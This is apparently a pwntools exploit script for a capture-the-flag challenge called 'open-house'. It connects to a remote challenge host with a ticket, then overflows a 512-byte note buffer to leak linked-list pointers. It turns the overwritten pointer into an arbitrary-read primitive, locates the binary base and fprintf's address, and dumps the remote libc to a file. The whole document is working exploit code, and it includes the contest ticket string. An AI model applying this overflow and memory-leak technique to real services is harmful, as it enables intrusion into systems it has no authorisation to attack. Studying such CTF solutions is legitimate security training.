#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
p = remote("open-house-6dvpeatmylgze.shellweplayaga.me",10001)
p.sendline(b"ticket{StreetDeed544n23:gaVixliBvaQ2kmfgEJGTGexWuFwQx4S2R3stRpvhf9WN-T5d}")

# 11-th
p.recvuntil("c|v|q> ")
p.sendline(b"c")
p.sendline(b"a" * 512)

# 12-th
p.recvuntil("c|v|m|d|q> ")
p.sendline(b"c")
p.sendline(b"b" * 512)

p.recvuntil("c|v|m|d|q> ")
p.sendline(b"v")

p.recvuntil(b"a" * 512)
nxt = u32(p.recv(4))
pre = u32(p.recv(4))

print('next -> ', hex(nxt))
print('prev -> ', hex(pre))

# 13-th
p.recvuntil("c|v|m|d|q> ")
p.sendline(b"c")
p.sendline(b"d" * 512)

def reads(addr):
    p.sendline(b"m")
    p.sendline(b"12")
    p.sendline(b"c" * 512 + p32(addr))

    p.recvuntil("c|v|m|d|q> ")
    p.sendline(b"v")
    for _ in range(12):
        p.recvuntil("**** - ")

    p.recvuntil("**** - ")
    data = p.recvuntil("c|v|m|d|q> ")

    idx = data.find(b'\nc|v|m|d|q> ')
    assert idx >= 0

    if idx == 0:
        return b'\x00'
    else:
        return data[0:idx]

def readl(addr):
    result = b''
    while len(result) < 4:
        data = reads(addr)
        addr += len(data)
        result += data
    return u32(result[0:4])

notes = [0] * 10

# 10-th
notes[9] = pre

for i in reversed(range(9)):
    # notes[i + 1]->prev == notes[i]
    notes[i] = readl(notes[i + 1] + 512 + 4)
    print(i, hex(notes[i]))

base = readl(notes[0] + 512 + 4)
print('base', hex(base))

target = base - 0x565df164 + 0x565df144
print('taget', hex(target))

fprintf = readl(target)
print('fprintf', hex(fprintf))

page = fprintf & ~0xfff
while True:
    page -= 0x1000
    if readl(page) == u32(b'\x7FELF'):
        break
print('found', hex(page))

# gdb.attach(p)

libc = open('libc.so', 'wb')
addr = page
while True:
    if addr & 0xFF == 0x0A or addr & 0xFF00 == 0x0A00:
        libc.write(b'\x00')
        addr += 1
        continue
    data = reads(addr)
    addr += len(data)
    libc.write(data)
libc.close()

p.interactive()